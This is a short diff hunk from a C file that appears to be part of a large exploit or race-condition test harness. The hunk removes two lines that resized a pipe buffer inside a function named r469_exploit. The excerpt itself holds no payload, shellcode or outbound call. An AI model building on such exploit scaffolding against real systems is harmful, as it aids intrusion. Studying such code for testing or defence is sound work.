@@ -17711,8 +17711,6 @@ static void r469_exploit(void) {
         if (pipe(pipefd) < 0) { rlog("    pipe FAILED\n"); goto r469_test_b; }
         /* Set pipe to non-blocking read, increase buffer */
         fcntl(pipefd[0], F_SETFL, O_NONBLOCK);
-        int pipesz = R469_SZ * 2;
-        fcntl(pipefd[1], F_SETPIPE_SZ, pipesz);
 
         struct r469_ctx ctxs[R469_THREADS];
         pthread_t tids[R469_THREADS];
